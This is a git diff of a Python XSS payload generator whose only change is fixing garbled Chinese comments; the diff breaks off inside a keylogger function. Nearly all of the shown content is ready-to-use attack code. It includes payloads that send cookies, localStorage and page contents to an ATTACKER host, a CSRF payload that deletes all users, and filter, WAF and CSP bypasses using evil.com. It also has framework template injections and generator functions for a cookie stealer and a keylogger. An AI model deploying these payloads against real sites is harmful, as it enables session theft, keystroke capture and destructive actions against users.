@@ -1,19 +1,19 @@
 # -*- coding: utf-8 -*-
-"""XSS (Cross-Site Scripting) Payload çæå¨.
+"""XSS (Cross-Site Scripting) Payload 生成器.
 
-è¦ç:
-    - åå°å XSS æ£æµ & å©ç¨
+覆盖:
+    - 反射型 XSS 检测 & 利用
     - DOM XSS
-    - WAF / è¿æ»¤ç»è¿
-    - Cookie çªå
-    - CSP ç»è¿
+    - WAF / 过滤绕过
+    - Cookie 窃取
+    - CSP 绕过
 """
 from typing import List, Dict
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  æ£æµ Payload
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  检测 Payload
+# ═══════════════════════════════════════════════════════════
 
 DETECTION: List[str] = [
     "<script>alert(1)</script>",
@@ -35,89 +35,89 @@ DETECTION: List[str] = [
 ]
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  Cookie çªå / æ°æ®å¤ä¼ 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  Cookie 窃取 / 数据外传
+# ═══════════════════════════════════════════════════════════
 
 EXFILTRATION: List[Dict[str, str]] = [
     {
-        "name": "Cookie çªå (Image)",
+        "name": "Cookie 窃取 (Image)",
         "payload": "<img src=x onerror=\"this.src='http://ATTACKER/?c='+document.cookie\">",
     },
     {
-        "name": "Cookie çªå (fetch)",
+        "name": "Cookie 窃取 (fetch)",
         "payload": "<script>fetch('http://ATTACKER/?c='+document.cookie)</script>",
     },
     {
-        "name": "Cookie çªå (new Image)",
+        "name": "Cookie 窃取 (new Image)",
         "payload": "<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>",
     },
     {
-        "name": "é¡µé¢åå®¹çªå",
+        "name": "页面内容窃取",
         "payload": "<script>fetch('http://ATTACKER/?d='+btoa(document.body.innerHTML))</script>",
     },
     {
-        "name": "LocalStorage çªå",
+        "name": "LocalStorage 窃取",
         "payload": "<script>for(k in localStorage){new Image().src='http://ATTACKER/?k='+k+'&v='+localStorage[k]}</script>",
     },
     {
-        "name": "CSRF + XSS ç»å",
+        "name": "CSRF + XSS 组合",
         "payload": "<script>\nfetch('/admin/delete?user=all',{method:'POST',credentials:'include'})\n</script>",
     },
 ]
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  WAF / è¿æ»¤ç»è¿
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  WAF / 过滤绕过
+# ═══════════════════════════════════════════════════════════
 
 BYPASS: Dict[str, List[str]] = {
-    "æ ç­¾åç»è¿": [
-        "<ScRiPt>alert(1)</ScRiPt>",                     # å¤§å°åæ··å
-        "<scr<script>ipt>alert(1)</scr</script>ipt>",     # æ ç­¾åµå¥
-        "<scr\x00ipt>alert(1)</scr\x00ipt>",              # NULL å­è
-        "<%73cript>alert(1)</%73cript>",                  # HTML ç¼ç 
+    "标签名绕过": [
+        "<ScRiPt>alert(1)</ScRiPt>",                     # 大小写混合
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",     # 标签嵌套
+        "<scr\x00ipt>alert(1)</scr\x00ipt>",              # NULL 字节
+        "<%73cript>alert(1)</%73cript>",                  # HTML 编码
     ],
-    "äºä»¶å¤çå¨ç»è¿": [
-        "<img src=x onerror=alert(1)>",                   # ç»å¸
-        "<img src=1 onerror=alert(1)>",                   # æ æsrc
-        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", # base64 ç¼ç 
-        "<img src=x onerror=window['al'+'ert'](1)>",     # å­ç¬¦ä¸²æ¼æ¥
-        "<img src=x oneonerrorror=alert(1)>",            # ååç»è¿
+    "事件处理器绕过": [
+        "<img src=x onerror=alert(1)>",                   # 经典
+        "<img src=1 onerror=alert(1)>",                   # 无效src
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", # base64 编码
+        "<img src=x onerror=window['al'+'ert'](1)>",     # 字符串拼接
+        "<img src=x oneonerrorror=alert(1)>",            # 双写绕过
     ],
-    "alert è¿æ»¤ç»è¿": [
-        "<script>prompt(1)</script>",                     # prompt æ¿ä»£
-        "<script>confirm(1)</script>",                    # confirm æ¿ä»£
-        "<script>top['al'+'ert'](1)</script>",           # å­ç¬¦ä¸²æ¼æ¥
-        "<script>(alert)(1)</script>",                    # æ¬å·ç»è¿
-        "<script>throw 1</script>",                       # throw æ¿ä»£
+    "alert 过滤绕过": [
+        "<script>prompt(1)</script>",                     # prompt 替代
+        "<script>confirm(1)</script>",                    # confirm 替代
+        "<script>top['al'+'ert'](1)</script>",           # 字符串拼接
+        "<script>(alert)(1)</script>",                    # 括号绕过
+        "<script>throw 1</script>",                       # throw 替代
         "<script>console.log(1)</script>",                # console.log
     ],
-    "æ¬å·è¿æ»¤ç»è¿": [
-        "<script>alert`1`</script>",                      # æ¨¡æ¿å­ç¬¦ä¸²
+    "括号过滤绕过": [
+        "<script>alert`1`</script>",                      # 模板字符串
         "<script>setTimeout`alert\\x281\\x29`</script>",  # setTimeout
-        "<img src=x onerror=alert`1`>",                   # ES6 æ¨¡æ¿
+        "<img src=x onerror=alert`1`>",                   # ES6 模板
         "<script>onerror=alert;throw 1</script>",          # throw
     ],
-    "å¼å·è¿æ»¤ç»è¿": [
+    "引号过滤绕过": [
         "<img src=x onerror=alert(String.fromCharCode(49))>",
-        "<script>eval(/\\x61lert(1)/.source)</script>",   # æ­£åç»è¿
-        '<img src=x onerror=alert(1)>',                    # æ å¼å·
+        "<script>eval(/\\x61lert(1)/.source)</script>",   # 正则绕过
+        '<img src=x onerror=alert(1)>',                    # 无引号
     ],
-    "ç©ºæ ¼è¿æ»¤ç»è¿": [
-        "<img/src=x/onerror=alert(1)>",                   # ææ æ¿ä»£
-        "<svg/onload=alert(1)>",                           # èªé­å
-        "<img%0asrc=x%0aonerror=alert(1)>",               # %0a æ¿ä»£
-        "<img%0dsrc=x%0donerror=alert(1)>",               # %0d æ¿ä»£
+    "空格过滤绕过": [
+        "<img/src=x/onerror=alert(1)>",                   # 斜杠替代
+        "<svg/onload=alert(1)>",                           # 自闭合
+        "<img%0asrc=x%0aonerror=alert(1)>",               # %0a 替代
+        "<img%0dsrc=x%0donerror=alert(1)>",               # %0d 替代
         "<img%09src=x%09onerror=alert(1)>",               # %09 tab
     ],
-    "CSP ç»è¿": [
-        "<script src='http://evil.com/payload.js'></script>",  # éè¦ CSP åè®¸
-        "<link rel=stylesheet href='http://evil.com/exfil.css'>",  # CSS å¤ä¼ 
-        "<base href='http://evil.com/'>",                   # base å«æ
+    "CSP 绕过": [
+        "<script src='http://evil.com/payload.js'></script>",  # 需要 CSP 允许
+        "<link rel=stylesheet href='http://evil.com/exfil.css'>",  # CSS 外传
+        "<base href='http://evil.com/'>",                   # base 劫持
         "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
     ],
-    "AngularJS / Vue ç»è¿": [
+    "AngularJS / Vue 绕过": [
         "{{constructor.constructor('alert(1)')()}}",       # Angular
         "{{$on.constructor('alert(1)')()}}",               # Angular
         "{{_openBlock.constructor('alert(1)')()}}",         # Vue
@@ -126,36 +126,36 @@ BYPASS: Dict[str, List[str]] = {
 
 
 def get_detection() -> List[str]:
-    """è·å XSS æ£æµ Payload."""
+    """获取 XSS 检测 Payload."""
     return DETECTION
 
 
 def get_exfiltration() -> list:
-    """è·åæ°æ®å¤ä¼  Payload."""
+    """获取数据外传 Payload."""
     return EXFILTRATION
 
 
 def get_bypass(category: str = "") -> dict:
-    """è·å WAF ç»è¿ Payload."""
+    """获取 WAF 绕过 Payload."""
     if category and category in BYPASS:
         return {category: BYPASS[category]}
     return BYPASS
 
 
 def generate_cookie_stealer(callback_url: str) -> str:
-    """çæ Cookie çªå Payload.
+    """生成 Cookie 窃取 Payload.
 
     Args:
-        callback_url: æ¥æ¶ Cookie ç URL
+        callback_url: 接收 Cookie 的 URL
     """
     return f"<script>new Image().src='{callback_url}?c='+document.cookie</script>"
 
 
 def generate_keylogger(callback_url: str) -> str:
-    """çæé®çè®°å½ Payload.
+    """生成键盘记录 Payload.
 
     Args:
-        callback_url: æ¥æ¶æé®è®°å½ç URL
+        callback_url: 接收按键记录的 URL
     """
     return f"""<script>
 document.onkeypress=function(e){{
